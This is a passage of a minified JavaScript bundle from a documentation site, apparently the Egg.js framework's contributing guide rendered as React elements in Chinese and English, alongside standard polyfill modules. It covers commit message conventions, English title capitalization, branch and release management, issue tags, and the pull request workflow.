run lint")," \u672c\u5730\u6d4b\u8bd5\u3002"),r.a.createElement("h3",{id:"commit-\u63d0\u4ea4\u89c4\u8303"},r.a.createElement(l["AnchorLink"],{to:"#commit-\u63d0\u4ea4\u89c4\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Commit \u63d0\u4ea4\u89c4\u8303"),r.a.createElement("p",null,"\u6839\u636e ",r.a.createElement(l["Link"],{to:"https://github.com/angular/angular.js/blob/master/CONTRIBUTING.md#commit-message-format"},"angular \u89c4\u8303"),"\u63d0\u4ea4 commit\uff0c \u8fd9\u6837 history \u770b\u8d77\u6765\u66f4\u52a0\u6e05\u6670\uff0c\u8fd8\u53ef\u4ee5\u81ea\u52a8\u751f\u6210 changelog\u3002"),r.a.createElement(o["a"],{code:"<type>(<scope>): <subject>\n<BLANK LINE>\n<body>\n<BLANK LINE>\n<footer>",lang:"xml"}),r.a.createElement("p",null,"\uff081\uff09type"),r.a.createElement("p",null,"\u63d0\u4ea4 commit \u7684\u7c7b\u578b\uff0c\u5305\u62ec\u4ee5\u4e0b\u51e0\u79cd"),r.a.createElement("ul",null,r.a.createElement("li",null,"feat: \u65b0\u529f\u80fd"),r.a.createElement("li",null,"fix: \u4fee\u590d\u95ee\u9898"),r.a.createElement("li",null,"docs: \u4fee\u6539\u6587\u6863"),r.a.createElement("li",null,"style: \u4fee\u6539\u4ee3\u7801\u683c\u5f0f\uff0c\u4e0d\u5f71\u54cd\u4ee3\u7801\u903b\u8f91"),r.a.createElement("li",null,"refactor: \u91cd\u6784\u4ee3\u7801\uff0c\u7406\u8bba\u4e0a\u4e0d\u5f71\u54cd\u73b0\u6709\u529f\u80fd"),r.a.createElement("li",null,"perf: \u63d0\u5347\u6027\u80fd"),r.a.createElement("li",null,"test: \u589e\u52a0\u4fee\u6539\u6d4b\u8bd5\u7528\u4f8b"),r.a.createElement("li",null,"chore: \u4fee\u6539\u5de5\u5177\u76f8\u5173\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u6587\u6863\u3001\u4ee3\u7801\u751f\u6210\u7b49\uff09"),r.a.createElement("li",null,"deps: \u5347\u7ea7\u4f9d\u8d56")),r.a.createElement("p",null,"\uff082\uff09scope"),r.a.createElement("p",null,"\u4fee\u6539\u6587\u4ef6\u7684\u8303\u56f4\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e doc, middleware, core, config, plugin\uff09"),r.a.createElement("p",null,"\uff083\uff09subject"),r.a.createElement("p",null,"\u7528\u4e00\u53e5\u8bdd\u6e05\u695a\u7684\u63cf\u8ff0\u8fd9\u6b21\u63d0\u4ea4\u505a\u4e86\u4ec0\u4e48"),r.a.createElement("p",null,"\uff084\uff09body"),r.a.createElement("p",null,"\u8865\u5145 subject\uff0c\u9002\u5f53\u589e\u52a0\u539f\u56e0\u3001\u76ee\u7684\u7b49\u76f8\u5173\u56e0\u7d20\uff0c\u4e5f\u53ef\u4e0d\u5199\u3002"),r.a.createElement("p",null,"\uff085\uff09footer"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("strong",null,"\u5f53\u6709\u975e\u517c\u5bb9\u4fee\u6539(Breaking Change)\u65f6\u5fc5\u987b\u5728\u8fd9\u91cc\u63cf\u8ff0\u6e05\u695a")),r.a.createElement("li",null,"\u5173\u8054\u76f8\u5173 issue\uff0c\u5982 ",r.a.createElement("code",null,"Closes #1, Closes #2, #3")),r.a.createElement("li",null,"\u5982\u679c\u529f\u80fd\u70b9\u6709\u65b0\u589e\u6216\u4fee\u6539\u7684\uff0c\u8fd8\u9700\u8981\u5173\u8054\u6587\u6863 ",r.a.createElement("code",null,"doc")," \u548c ",r.a.createElement("code",null,"egg-core")," \u7684 PR\uff0c\u5982 ",r.a.createElement("code",null,"eggjs/egg-core#123"))),r.a.createElement("p",null,"\u793a\u4f8b"),r.a.createElement(o["a"],{code:"fix($compile): [BREAKING_CHANGE] couple of unit tests for IE9\n\nOlder IEs serialize html uppercased, but IE9 does not...\nWould be better to expect case insensitive, unfortunately jasmine does\nnot allow to user regexps for throw expectations.\n\nDocument change on eggjs/egg#123\n\nCloses #392\n\nBREAKING CHANGE:\n\n  Breaks foo.bar api, foo.baz should be used instead",lang:"unknown"}),r.a.createElement("p",null,"\u8be6\u60c5\u8bf7\u67e5\u770b\u5177\u4f53",r.a.createElement(l["Link"],{to:"https://docs.google.com/document/d/1QrDFcIiPjSLDn3EL15IJygNPiHORgU1_OOAqWjiDU5Y/edit"},"\u6587\u6863"),"\u3002"),r.a.createElement("h3",{id:"\u82f1\u8bed\u7ffb\u8bd1\u89c4\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u82f1\u8bed\u7ffb\u8bd1\u89c4\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u82f1\u8bed\u7ffb\u8bd1\u89c4\u8303"),r.a.createElement("p",null,"\u82f1\u8bed\u6b63\u6587\u6309\u7167\u4e00\u822c\u82f1\u8bed\u8bed\u6cd5\u89c4\u5f8b\u4e66\u5199\u5373\u53ef\uff0c\u4f46\u6807\u9898\u6bd4\u8f83\u7279\u6b8a\uff0c\u5e94\u8be5\u6309\u7167\u4ee5\u4e0b\u89c4\u8303\u8fdb\u884c\u4e66\u5199\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u540d\u8bcd\u3001\u52a8\u8bcd\u3001\u4ee3\u8bcd\u3001\u5f62\u5bb9\u8bcd\u3001\u526f\u8bcd\u7b49\u9996\u5b57\u6bcd\u5927\u5199\uff0c\u4ecb\u8bcd\u3001\u51a0\u8bcd\u3001\u8fde\u8bcd\u3001\u611f\u53f9\u8bcd\u548c\u52a9\u8bcd\u9996\u5b57\u6bcd\u5c0f\u5199\uff0c",r.a.createElement("em",null,"\u6807\u9898\u7b2c\u4e00\u4e2a\u5355\u8bcd\u3001\u6700\u540e\u4e00\u4e2a\u5355\u8bcd\u65e0\u8bba\u8bcd\u6027\u9996\u5b57\u6bcd\u5e94\u8be5\u5927\u5199"),"\u3002"),r.a.createElement("li",null,"\u4e13\u6709\u540d\u8bcd\uff08\u5982\u76f4\u63a5\u5f15\u7528\u67d0\u4e2a\u53d8\u91cf\uff0c\u6216\u8005\u67d0\u4e2a\u63d2\u4ef6\u540d\u79f0\u7b49\uff09\uff0c\u5fc5\u987b\u4f7f\u7528\u53cd\u5355\u5f15\u53f7\uff08\u952e\u76d8\u4e0a Esc \u6b63\u4e0b\u65b9\uff09\u8fdb\u884c\u5f15\u7528\uff0c\u5e76\u4fdd\u6301\u539f\u6765\u5927\u5c0f\u5199\u3002"),r.a.createElement("li",null,"\u8d85\u8fc7 5 \u4e2a\u5b57\u6bcd\u7684\u4ecb\u8bcd\u9996\u5b57\u6bcd\u5e94\u8be5\u5927\u5199\uff0c\u5426\u5219\u4e00\u5f8b\u5c0f\u5199\u3002"),r.a.createElement("li",null,"\u5982\u679c\u662f\u91cd\u8981\u63d0\u793a\u6027\u6807\u9898\uff0c\u6216\u8005\u662f\u4e13\u6709\u540d\u79f0\u6807\u9898\uff08\u4f8b\u5982 Http \u8bf7\u6c42\u65b9\u6cd5\uff1aGET\uff0cPOST\uff0cPUT\uff0cDELETE\uff09\uff0c\u53ef\u4ee5\u5168\u90e8\u5b57\u6bcd\u90fd\u7528\u5927\u5199\uff08\u614e\u91cd\u8003\u8651\uff09\u3002"),r.a.createElement("li",null,"\u5982\u679c\u6807\u9898\u5c5e\u4e8e\u201c\u52a8\u5bbe\u201d\u6027\u8d28\u7684\u77ed\u8bed\uff08\u5982\u201c\u914d\u7f6e\u7ba1\u7406\u201d\uff09\uff0c\u5c3d\u91cf\u7ffb\u8bd1\u6210\u201c\u5bbe+\u52a8\u8bcd\u540d\u8bcd\u201d\u7684\u5f62\u5f0f\uff08Configuration Management\uff09\uff0c\u6216\u8005\u662f\u201c\u52a8\u540d\u8bcd+\u5bbe\u8bed\u201d\u7684\u5f62\u5f0f\uff08Managing Configuration\uff09\u3002"),r.a.createElement("li",null,"\u5982\u679c\u6807\u9898\u88ab\u5f53\u505a\u4e00\u4e2a\u5b8c\u6574\u7684\u82f1\u8bed\u53e5\u5b50\uff0c\u8bf7\u6309\u7167\u82f1\u8bed\u53e5\u5b50\u7684\u8bed\u6cd5\u683c\u5f0f\u5927\u5c0f\u5199\uff08\u5982\uff1a\u5e38\u89c1\u95ee\u9898 FAQ \u4e2d\u6bcf\u4e00\u4e2a\u6807\u9898\u90fd\u662f\u4e00\u4e2a\u82f1\u8bed\u53e5\u5b50\uff09\u3002")),r.a.createElement("p",null,"\u6709\u5173\u8be6\u60c5\uff0c\u53ef\u4ee5\u53c2\u8003",r.a.createElement(l["Link"],{to:"https://headlinecapitalization.com/"},"\u82f1\u8bed\u6807\u9898\u5927\u5c0f\u5199"),"\u3002"),r.a.createElement("h2",{id:"\u53d1\u5e03\u7ba1\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u53d1\u5e03\u7ba1\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53d1\u5e03\u7ba1\u7406"),r.a.createElement("p",null,"egg \u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"https://semver.org/lang/zh-CN/"},"semver")," \u8bed\u4e49\u5316\u7248\u672c\u53f7\u8fdb\u884c\u53d1\u5e03\u3002"),r.a.createElement("h3",{id:"\u5206\u652f\u7b56\u7565"},r.a.createElement(l["AnchorLink"],{to:"#\u5206\u652f\u7b56\u7565","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5206\u652f\u7b56\u7565"),r.a.createElement("p",null,r.a.createElement("code",null,"master")," \u5206\u652f\u4e3a\u5f53\u524d\u7a33\u5b9a\u53d1\u5e03\u7684\u7248\u672c\uff0c",r.a.createElement("code",null,"next")," \u5206\u652f\u4e3a\u4e0b\u4e00\u4e2a\u5f00\u53d1\u4e2d\u7684\u5927\u7248\u672c\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u53ea\u7ef4\u62a4\u4e24\u4e2a\u7248\u672c\uff0c\u9664\u975e\u6709\u5b89\u5168\u95ee\u9898\uff0c\u5426\u5219\u4fee\u590d\u53ea\u4f1a patch \u5230 ",r.a.createElement("code",null,"master")," \u548c ",r.a.createElement("code",null,"next")," \u5206\u652f\uff0c\u5176\u4ed6\u66f4\u65b0\u63a8\u52a8\u4e0a\u5c42\u6846\u67b6\u5347\u7ea7\u5230\u7a33\u5b9a\u5927\u7248\u672c\u7684\u6700\u65b0\u7248\u672c\u3002"),r.a.createElement("li",null,"\u6240\u6709 API \u7684\u5e9f\u5f03\u90fd\u9700\u8981\u5728\u5f53\u524d\u7684\u7a33\u5b9a\u7248\u672c\u4e0a ",r.a.createElement("code",null,"deprecate")," \u63d0\u793a\uff0c\u5e76\u4fdd\u8bc1\u5728\u5f53\u524d\u7684\u7a33\u5b9a\u7248\u672c\u4e0a\u4e00\u76f4\u517c\u5bb9\u5230\u65b0\u7248\u672c\u7684\u53d1\u5e03\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"master")," \u5206\u652f\u4e0d\u8bbe\u7f6e publish tag\uff0c\u4e0a\u5c42\u6846\u67b6\u57fa\u4e8e semver \u4f9d\u8d56\u7a33\u5b9a\u7248\u672c\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"next")," \u5206\u652f\u8bbe\u7f6e tag \u4e3a ",r.a.createElement("code",null,"next"),"\uff0c\u4e0a\u5c42\u6846\u67b6\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"egg@next")," \u5f15\u7528\u5f00\u53d1\u4e2d\u7684\u7248\u672c\u8fdb\u884c\u6d4b\u8bd5\u3002"),r.a.createElement("li",null,"egg \u6301\u7eed\u7ef4\u62a4\u7684\u7248\u672c\u4ee5 Milestone \u4e3a\u51c6\uff0c\u53ea\u8981\u662f\u5f00\u7740\u7684\u7248\u672c\u90fd\u4f1a\u8fdb\u884c\u4fee\u590d\u3002")),r.a.createElement("h3",{id:"\u53d1\u5e03\u7b56\u7565"},r.a.createElement(l["AnchorLink"],{to:"#\u53d1\u5e03\u7b56\u7565","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53d1\u5e03\u7b56\u7565"),r.a.createElement("p",null,"\u6bcf\u4e2a\u5927\u7248\u672c\u90fd\u6709\u4e00\u4e2a\u53d1\u5e03\u7ecf\u7406\u7ba1\u7406\uff08PM\uff09\uff0c\u4ed6/\u5979\u8981\u505a\u7684\u4e8b\u60c5"),r.a.createElement("h4",{id:"\u51c6\u5907\u5de5\u4f5c"},r.a.createElement(l["AnchorLink"],{to:"#\u51c6\u5907\u5de5\u4f5c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u51c6\u5907\u5de5\u4f5c\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5efa\u7acb milestone\uff0c\u786e\u8ba4\u9700\u6c42\u5173\u8054 milestone\uff0c\u6307\u6d3e\u548c\u66f4\u65b0 issues\uff0c\u5982 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/milestone/1"},"1.x milestone"),"\u3002"),r.a.createElement("li",null,"\u4ece ",r.a.createElement("code",null,"master")," \u5206\u652f\u65b0\u5efa ",r.a.createElement("code",null,"next")," \u5206\u652f\uff0c\u5e76\u8bbe\u7f6e tag \u4e3a ",r.a.createElement("code",null,"next"),"\u3002")),r.a.createElement("h4",{id:"\u53d1\u5e03\u524d"},r.a.createElement(l["AnchorLink"],{to:"#\u53d1\u5e03\u524d","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53d1\u5e03\u524d\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u786e\u8ba4\u5f53\u524d Milestone \u6240\u6709\u7684 issue \u90fd\u5df2\u5173\u95ed\u6216\u53ef\u5ef6\u671f\uff0c\u5b8c\u6210\u6027\u80fd\u6d4b\u8bd5\u3002"),r.a.createElement("li",null,"\u53d1\u8d77\u4e00\u4e2a\u65b0\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/nodejs/node/pull/4181"},"Release Proposal MR"),"\uff0c\u6309\u7167 ",r.a.createElement(l["Link"],{to:"https://github.com/nodejs/node/blob/master/CHANGELOG.md"},"node CHANGELOG")," \u8fdb\u884c ",r.a.createElement("code",null,"History")," \u7684\u7f16\u5199\uff0c\u4fee\u6b63\u6587\u6863\u4e2d\u4e0e\u7248\u672c\u76f8\u5173\u7684\u5185\u5bb9\uff0ccommits \u53ef\u4ee5\u81ea\u52a8\u751f\u6210\u3002",r.a.createElement(o["a"],{code:"$ npm run commits",lang:"bash"})),r.a.createElement("li",null,"\u6307\u5b9a\u4e0b\u4e00\u4e2a\u5927\u7248\u672c\u7684 PM\u3002")),r.a.createElement("h4",{id:"\u53d1\u5e03\u65f6"},r.a.createElement(l["AnchorLink"],{to:"#\u53d1\u5e03\u65f6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u53d1\u5e03\u65f6\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5c06\u8001\u7684\u7a33\u5b9a\u7248\u672c\uff08master\uff09\u5907\u4efd\u5230\u4ee5\u5f53\u524d\u5927\u7248\u672c\u4e3a\u540d\u5b57\u7684\u5206\u652f\u4e0a\uff08\u4f8b\u5982 ",r.a.createElement("code",null,"1.x"),"\uff09\uff0c\u5e76\u8bbe\u7f6e tag \u4e3a ",r.a.createElement("code",null,"release-","{","v","}",".x"),"\uff08 v \u4e3a\u5f53\u524d\u7248\u672c\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"release-1.x"),"\uff09\u3002"),r.a.createElement("li",null,"\u5c06 ",r.a.createElement("code",null,"next")," \u5206\u652f\u63a8\u9001\u5230 ",r.a.createElement("code",null,"master"),"\uff0c\u6210\u4e3a\u65b0\u7684\u7a33\u5b9a\u7248\u672c\u5206\u652f\uff0c\u5e76\u53bb\u9664 ",r.a.createElement("code",null,"next")," tag\uff0c\u4fee\u6539 README \u4e2d\u4e0e\u5206\u652f\u76f8\u5173\u7684\u5185\u5bb9\u3002"),r.a.createElement("li",null,"\u53d1\u5e03\u65b0\u7684\u7a33\u5b9a\u7248\u672c\u5230 ",r.a.createElement(l["Link"],{to:"http://npmjs.com/"},"npm"),"\uff0c\u5e76\u901a\u77e5\u4e0a\u5c42\u6846\u67b6\u8fdb\u884c\u66f4\u65b0\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"npm publish")," \u4e4b\u524d\uff0c\u8bf7\u5148\u9605\u8bfb ",r.a.createElement(l["Link"],{to:"https://fengmk2.com/blog/2016/how-i-publish-a-npm-package"},"\u6211\u662f\u5982\u4f55\u53d1\u5e03\u4e00\u4e2a npm \u5305\u7684"),"\u3002")),r.a.createElement("p",null,"\u4e0a\u8ff0\u63cf\u8ff0\u4e2d\u6240\u6709\u7684\u8bbe\u7f6e tag \u90fd\u662f\u6307\u5728 ",r.a.createElement("code",null,"package.json")," \u4e2d\u8bbe\u7f6e npm \u7684 tag\u3002"),r.a.createElement(o["a"],{code:'"publishConfig": {\n  "tag": "next"\n}',lang:"json"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"UJM+":function(e,t,n){"use strict";var a=n("XaNN"),r=n("a7jj"),l=[].slice,o={},i=function(e,t,n){if(!(t in o)){for(var a=[],r=0;r<t;r++)a[r]="a["+r+"]";o[t]=Function("C,a","return new C("+a.join(",")+")")}return o[t](e,n)};e.exports=Function.bind||function(e){var t=a(this),n=l.call(arguments,1),o=function(){var a=n.concat(l.call(arguments));return this instanceof o?i(t,a.length,a):t.apply(e,a)};return r(t.prototype)&&(o.prototype=t.prototype),o}},UKi4:function(e,t,n){},UYZS:function(e,t,n){var a=n("0mt+"),r=n("7un0"),l=n("oyD1"),o=n("Yftc"),i=r.has,c=r.toKey,s=function(e,t,n){var a=i(e,t,n);if(a)return!0;var r=o(t);return null!==r&&s(e,r,n)};a({target:"Reflect",stat:!0},{hasMetadata:function(e,t){var n=arguments.length<3?void 0:c(arguments[2]);return s(e,l(t),n)}})},UyPl:function(e,t,n){n("j+GT"),e.exports=self.fetch.bind(self)},V2dk:function(e,t,n){"use strict";var a=n("XaNN"),r=n("G9w8"),l=n("NBU9");e.exports=function(e){var t,n,o,i,c=arguments.length,s=c>1?arguments[1]:void 0;return a(this),t=void 0!==s,t&&a(s),void 0==e?new this:(n=[],t?(o=0,i=r(s,c>2?arguments[2]:void 0,2),l(e,(function(e){n.push(i(e,o++))}))):l(e,n.push,n),new this(n))}},V3tB:function(e,t,n){var a=n("sDrD"),r=n("A0UU"),l=function(e){return"function"==typeof e?e:void 0};e.exports=function(e,t){return arguments.length<2?l(a[e])||l(r[e]):a[e]&&a[e][t]||r[e]&&r[e][t]}},VFN8:function(e,t,n){"use strict";e.exports=function(e){return encodeURIComponent(e).replace(/[!'()*]/g,(function(e){return"%".concat(e.charCodeAt(0).toString(16).toUpperCase())}))}},VGJu:function(e,t,n){"use strict";n.d(t,"a",(function(){return c}));var a=n("FC4M");function r(e){if(Array.isArray(e))return Object(a["a"])(e)}var l=n("sBM8"),o=n("b8/4");function i(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function c(e){return r(e)||Object(l["a"])(e)||Object(o["a"])(e)||i()}},VGn1:function(e,t,n){var a,r;(function(){"use strict";var n={}.hasOwnProperty;function l(){for(var e=[],t=0;t<arguments.length;t++){var a=arguments[t];if(a){var r=typeof a;if("string"===r||"number"===r)e.push(a);else if(Array.isArray(a)){if(a.length){var o=l.apply(null,a);o&&e.push(o)}}else if("object"===r){if(a.toString!==Object.prototype.toString&&!a.toString.toString().includes("[native code]")){e.push(a.toString());continue}for(var i in a)n.call(a,i)&&a[i]&&e.push(i)}}}return e.join(" ")}e.exports?(l["default"]=l,e.exports=l):(a=[],r=function(){return l}.apply(t,a),void 0===r||(e.exports=r))})()},VPwr:function(e,t,n){var a=n("jAHp"),r=n("vbCh"),l=a("keys");e.exports=function(e){return l[e]||(l[e]=r(e))}},VWWG:function(e,t,n){var a=n("u9el");a("Uint16",(function(e){return function(t,n,a){return e(this,t,n,a)}}))},Ve8J:function(e,t,n){var a=n("XaNN"),r=n("m/os"),l=n("W5/F"),o=n("N0Us"),i=function(e){return function(t,n,i,c){a(n);var s=r(t),u=l(s),d=o(s.length),m=e?d-1:0,p=e?-1:1;if(i<2)while(1){if(m in u){c=u[m],m+=p;break}if(m+=p,e?m<0:d<=m)throw TypeError("Reduce of empty array with no initial value")}for(;e?m>=0:d>m;m+=p)m in u&&(c=n(c,u[m],m,s));return c}};e.exports={left:i(!1),right:i(!0)}},VfHC:function(e,t){e.exports=Object.is||function(e,t){return e===t?0!==e||1/e===1/t:e!=e&&t!=t}},"VnG/":function(e,t,n){"use strict";var a=n("0mt+"),r=n("Ve8J").left,l=n("xxe1"),o=n("hOjR"),i=l("reduce"),c=o("reduce",{1:0});a({target:"Array",proto:!0,forced:!i||!c},{reduce:function(e){return r(this,e,arguments.length,arguments.length>1?arguments[1]:void 0)}})},W0Nj:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"If you have any comment or advice, please report your ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues"},"issue"),", or make any change as you wish and submit a ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/pulls"},"PR"),"."),r.a.createElement("h2",{id:"reporting-new-issues"},r.a.createElement(l["AnchorLink"],{to:"#reporting-new-issues","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Reporting New Issues"),r.a.createElement("ul",null,r.a.createElement("li",null,"Please specify what kind of issue it is."),r.a.createElement("li",null,"Before you report an issue, please search for related issues. Make sure you are not going to open a duplicate issue."),r.a.createElement("li",null,"Explain your purpose clearly in tags(see ",r.a.createElement("strong",null,"Useful Tags"),"), title, or content.")),r.a.createElement("p",null,"Egg group members will confirm the purpose of the issue, replace more accurate tags for it, identify related milestone, and assign developers working on it. Tags can be divided into two groups, ",r.a.createElement("code",null,"type")," and ",r.a.createElement("code",null,"scope"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,"type: What kind of issue, e.g. ",r.a.createElement("code",null,"feature"),", ",r.a.createElement("code",null,"bug"),", ",r.a.createElement("code",null,"documentation"),", ",r.a.createElement("code",null,"performance"),", ",r.a.createElement("code",null,"support")," ..."),r.a.createElement("li",null,"scope: What did you modified. Which files are modified, e.g. ",r.a.createElement("code",null,"core: xx"),", ",r.a.createElement("code",null,"plugin: xx"),", ",r.a.createElement("code",null,"deps: xx"))),r.a.createElement("h3",{id:"useful-tags"},r.a.createElement(l["AnchorLink"],{to:"#useful-tags","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Useful Tags"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"support"),": the issue asks helps from developers of our group. If you need helps to locate and handle problems or have any idea to improve Egg, mark it as ",r.a.createElement("code",null,"support"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"bug"),": if you find a problem which possiblly could be a bug, please tag it as ",r.a.createElement("code",null,"bug"),". Then our group members will review that issue. If it is confirmed as a bug by our group member, this issue will be tagged as ",r.a.createElement("code",null,"confirmed"),".",r.a.createElement("ul",null,r.a.createElement("li",null,"A confirmed bug will be resolved prior."),r.a.createElement("li",null,"If the bug has negative impact on running online application, it will be tagged as ",r.a.createElement("code",null,"critical"),", which refers to top priority, and will be fixed ASAP!"),r.a.createElement("li",null,"A bug will be fixed from lowest necessary version, e.g. A bug needs to be fixed from 0.9.x, then this issue will be tagged as ",r.a.createElement("code",null,"0.9"),", ",r.a.createElement("code",null,"0.10"),", ",r.a.createElement("code",null,"1.0"),", ",r.a.createElement("code",null,"1.1"),", referring that the bug is required to be fixed in those versions."))),r.a.createElement("li",null,r.a.createElement("code",null,"core: xx"),": the issue is related to core, e.g. ",r.a.createElement("code",null,"core: loader")," refers that the issue is related with ",r.a.createElement("code",null,"loader")," config."),r.a.createElement("li",null,r.a.createElement("code",null,"plugin: xx"),": the issue is related to plugins. e.g. ",r.a.createElement("code",null,"plugin: session")," refers that the issue is related to ",r.a.createElement("code",null,"session")," plugin."),r.a.createElement("li",null,r.a.createElement("code",null,"deps: xx"),": the issue is related to ",r.a.createElement("code",null,"dependencies"),", e.g. ",r.a.createElement("code",null,"deps:egg-cors")," refers that the issue is related to ",r.a.createElement("code",null,"egg-cors")),r.a.createElement("li",null,r.a.createElement("code",null,"chore: documentation"),": the issue is about documentation. Need to modify documentation.")),r.a.createElement("h2",{id:"documentation"},r.a.createElement(l["AnchorLink"],{to:"#documentation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Documentation"),r.a.createElement("p",null,"All features must be submitted along with documentations. The documentations should satify several requirements."),r.a.createElement("ul",null,r.a.createElement("li",null,"Documentations must clarify one or more aspects of the feature, depending on the nature of feature: what it is, why it happens and how it works."),r.a.createElement("li",null,"It's better to include a series of procedues to explain how to fix the problem. You are also encourgaed to provide ",r.a.createElement("strong",null,"simple, but self-explanatory")," demo. All demos should be compiled at ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples"},"eggjs/examples")," repository."),r.a.createElement("li",null,"Please provide essential urls, such as application process, terminology explainations and references.")),r.a.createElement("h2",{id:"submitting-code"},r.a.createElement(l["AnchorLink"],{to:"#submitting-code","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Submitting Code"),r.a.createElement("h3",{id:"pull-request-guide"},r.a.createElement(l["AnchorLink"],{to:"#pull-request-guide","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Pull Request Guide"),r.a.createElement("p",null,"If you are developer of egg repo and you are willing to contribute, feel free to create a new branch, finish your modification and submit a PR. Egg group will review your work and merge it to master branch."),r.a.createElement(o["a"],{code:"# Create a new branch for development. The name of branch should be semantic, avoiding words like 'update' or 'tmp'. We suggest to use feature/xxx, if the modification is about to implement a new feature.\n$ git checkout -b branch-name\n\n# Run the test after you finish your modification. Add new test cases or change old ones if you feel necessary\n$ npm test\n\n# If your modification pass the tests, congradulations it's time to push your work back to us. Notice that the commit message should be wirtten in the following format.\n$ git add . # git add -u to delete files\n$ git commit -m \"fix(role): role.use must xxx\"\n$ git push origin branch-name",lang:"bash"}),r.a.createElement("p",null,"Then you can create a Pull Request at ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/pulls"},"egg")),r.a.createElement("p",null,"No one can garantee how much will be remembered about certain PR after some time. To make sure we can easily recap what happened previously, please provide the following information in your PR."),r.a.createElement("ol",null,r.a.createElement("li",null,"Need: What function you want to achieve (Generally, please point out which issue is related)."),r.a.createElement("li",null,"Updating Reason: Different with issue. Briefly describe your reason and logic about why you need to make such modification."),r.a.createElement("li",null,"Related Testing: Briefly descirbe what part of testing is relevant to your modification."),r.a.createElement("li",null,"User Tips: Notice for Egg users. You can skip this part, if the PR is not about update in API or potential compatibility problem.")),r.a.createElement("h3",{id:"style-guide"},r.a.createElement(l["AnchorLink"],{to:"#style-guide","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Style Guide"),r.a.createElement("p",null,"Eslint can help to identify styling issues that may exist in your code. Your code is required to pass the test from eslint. Run the test locally by ",r.a.createElement("code",null,"$ npm run lint"),"."),r.a.createElement("h3",{id:"commit-message-format"},r.a.createElement(l["AnchorLink"],{to:"#commit-message-format","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Commit Message Format"),r.a.createElement("p",null,"You are encouraged to use ",r.a.createElement(l["Link"],{to:"https://github.com/angular/angular.js/blob/master/DEVELOPERS.md#-git-commit-guidelines"},"angular commit-message-format")," to write commit message. In this way, we could have a more trackable history and an automatically generated changelog."),r.a.createElement(o["a"],{code:"<type>(<scope>): <subject>\n<BLANK LINE>\n<body>\n<BLANK LINE>\n<footer>",lang:"xml"}),r.a.createElement("p",null,"\uff081\uff09type"),r.a.createElement("p",null,"Must be one of the following:"),r.a.createElement("ul",null,r.a.createElement("li",null,"feat: A new feature"),r.a.createElement("li",null,"fix: A bug fix"),r.a.createElement("li",null,"docs: Documentation-only changes"),r.a.createElement("li",null,"style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)"),r.a.createElement("li",null,"refactor: A code change that neither fixes a bug nor adds a feature"),r.a.createElement("li",null,"perf: A code change that improves performance"),r.a.createElement("li",null,"test: Adding missing tests"),r.a.createElement("li",null,"chore: Changes to the build process or auxiliary tools and libraries such as documentation generation"),r.a.createElement("li",null,"deps: Updates about dependencies")),r.a.createElement("p",null,"\uff082\uff09scope"),r.a.createElement("p",null,"The scope could be anything specifying place of the commit change. For example ",r.a.createElement("span",{className:"math math-inline"},r.a.createElement("mjx-container",{className:"MathJax",jax:"SVG"},r.a.createElement("svg",{style:{verticalAlign:"-0.439ex"},xmlns:"http://www.w3.org/2000/svg",width:"8.629ex",height:"2.009ex",role:"img",focusable:"false",viewBox:"0 -694 3814 